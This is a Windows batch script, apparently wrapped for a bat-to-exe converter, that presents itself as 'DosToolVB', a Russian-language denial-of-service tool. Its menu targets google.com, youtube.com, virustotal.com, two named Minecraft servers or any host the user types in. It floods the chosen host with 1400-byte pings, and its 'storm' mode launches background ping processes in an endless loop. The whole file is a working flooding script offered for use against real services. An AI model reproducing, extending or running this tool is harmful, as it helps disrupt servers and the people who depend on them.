::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAjk
::fBw5plQjdCyDJGyX8VAjFDNbWReHAE+/Fb4I5/jHy+WUlkISWNQdRIbY1brAKeMcig==
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSjk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+IeA==
::cxY6rQJ7JhzQF1fEqQJiZksaHErSXA==
::ZQ05rAF9IBncCkqN+0xwdVsGAlTMbCXqZg==
::ZQ05rAF9IAHYFVzEqQIUJwhgQwuOCkna
::eg0/rx1wNQPfEVWB+kM9LVsJDCCNL1+1Cbkqyqb+9+/n
::fBEirQZwNQPfEVWB+kM9LVsJDCCNL1+1Cbkqyog=
::cRolqwZ3JBvQF1fEqQIRaA5ARQiLKHL6ALoOqOXy4ePHhkIuFOMrbI7Y0afAQA==
::dhA7uBVwLU+EWE+G+0MkSA==
::YQ03rBFzNR3SWATE4kA/KQ8YDFbSbj3a
::dhAmsQZ3MwfNWATE4kA/KQ8YDFbSbj3a
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRmo/UE1JghRSESXMm+/FPUK6uf6+6qLq04YWvE6Nu8=
::Zh4grVQjdCyDJGyX8VAjFDNbWReHAE+/Fb4I5/jHy+WUlkISWNQdRKvUyYCBL+wlyAvhbZNN
::YB416Ek+ZG8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
color 30
chcp 65001 >nul
title DosToolVB
cls
title DosToolVB - check license
if not exist "license.rtf" (
    cls
    echo ================================
    echo         ОШИБКА ЛИЦЕНЗИИ
    echo ================================
    echo Файл license.rtf не найден!
    echo Пожалуйста, убедитесь, что файл лицензии
    echo находится в той же папке, что и программа.
    echo ================================
    pause
    exit /b
)
cls
title DosToolVB - check internet
echo ================================
echo     Проверка соединения...
echo ================================
ping 8.8.8.8 -n 2 >nul
if errorlevel 1 (
    cls
    echo ================================
    echo         ОШИБКА СЕТИ
    echo ================================
    echo Нет соединения с интернетом!
    echo Проверьте подключение и повторите.
    echo ================================
    pause
    exit /b
)
:menu
title DosToolVB - main
cls
echo ================================
echo            МЕНЮ
echo       Dos Tool v2.0.0
echo ================================
echo   [1] google.com
echo   [2] pulsevisuals.pro
echo   [3] youtube.com
echo   [4] virustotal.com
echo   [5] Свой сайт
echo   [6] Майнкрафт серверы
echo   [0] Выход
echo ================================
set /p choice="Выберите пункт: "
if "%choice%"=="0" goto exit
if "%choice%"=="1" goto prog1
if "%choice%"=="2" goto prog2
if "%choice%"=="3" goto prog3
if "%choice%"=="4" goto prog4
if "%choice%"=="5" goto prog5
if "%choice%"=="6" goto prog6
echo Неверный выбор.
timeout /t 2 >nul
cls
goto menu
:prog1
set site=google.com
goto ask_speed
:prog2
set site=pulsevisuals.pro
goto ask_speed
:prog3
set site=youtube.com
goto ask_speed
:prog4
set site=virustotal.com
goto ask_speed
:prog5
cls
echo ================================
echo         ВВЕДИТЕ САЙТ
echo ================================
set /p site="Введите URL (например, habr.com): "
if "%site%"=="" (
    echo Вы ничего не ввели!
    timeout /t 2 >nul
    goto menu
)
set site=%site:http://=%
set site=%site:https://=%
set site=%site: =%
goto ask_speed
:prog6
cls
echo ================================
echo      МАЙНКРАФТ СЕРВЕРЫ
echo ================================
echo   [1] play.funtime.su
echo   [2] tt.funtime.su
echo   [3] Свой IP (например, aternos.me)
echo   [0] Назад
echo ================================
set /p mc_choice="Выберите сервер: "
if "%mc_choice%"=="0" goto menu
if "%mc_choice%"=="1" set site=play.funtime.su & goto ask_speed
if "%mc_choice%"=="2" set site=tt.funtime.su & goto ask_speed
if "%mc_choice%"=="3" goto mc_custom
echo Неверный выбор!
timeout /t 2 >nul
goto prog6
:mc_custom
cls
echo ================================
echo     ВВЕДИТЕ IP СЕРВЕРА
echo ================================
set /p site="Введите IP (например, my.aternos.me): "
if "%site%"=="" (
    echo Вы ничего не ввели!
    timeout /t 2 >nul
    goto prog6
)
set site=%site:http://=%
set site=%site:https://=%
set site=%site: =%
goto ask_speed
:ask_speed
cls
echo ================================
echo        ВЫБОР СКОРОСТИ
echo ================================
echo   [1] Тихая (1 пакет/сек)
echo   [2] Средняя (10 пакетов/сек)
echo   [3] Шторм (максимум)
echo   [0] Без задержки (по умолчанию)
echo ================================
set /p speed="Выберите режим: "
if "%speed%"=="0" set delay=0 & goto ask_packets
if "%speed%"=="1" set delay=1000 & goto ask_packets
if "%speed%"=="2" set delay=100 & goto ask_packets
if "%speed%"=="3" set delay=0 & goto ask_packets
echo Неверный выбор!
timeout /t 2 >nul
goto ask_speed
:ask_packets
cls
echo ================================
echo       КОЛИЧЕСТВО ПАКЕТОВ
echo ================================
echo   [Введите число пакетов]
echo   [0 или пусто = бесконечно]
echo ================================
set /p packets="Количество: "
if "%packets%"=="" goto infinite
if "%packets%"=="0" goto infinite
echo %packets%|findstr /r "^[0-9][0-9]*$" >nul
if errorlevel 1 (
    echo Ошибка: введите число!
    timeout /t 2 >nul
    goto ask_packets
)
cls
title DosToolVB - %site%
echo ================================
echo   ПИНГУЮ %site%
echo   Пакетов: %packets%
echo ================================
echo.
ping %site% -n %packets% -l 1400
pause
goto menu
:infinite
cls
title DosToolVB - %site% (бесконечно)
if "%delay%"=="0" (
    echo ================================
    echo   ПИНГУЮ %site% (ШТОРМ)
    echo   Нажмите Ctrl+C для остановки
    echo ================================
    echo.
    :storm
    start /b ping %site% -n 1 -l 1400 -w 1
    goto storm
) else (
    echo ================================
    echo   ПИНГУЮ %site% (БЕСКОНЕЧНО)
    echo   Задержка: %delay% мс
    echo   Нажмите Ctrl+C для остановки
    echo ================================
    echo.
    :loop
    ping %site% -n 1 -l 1400
    timeout /t %delay% /nobreak >nul
    goto loop
)
:exit
cls
echo ================================
echo              ВЫХОД...
echo ================================
timeout /t 1 >nul
exit /b
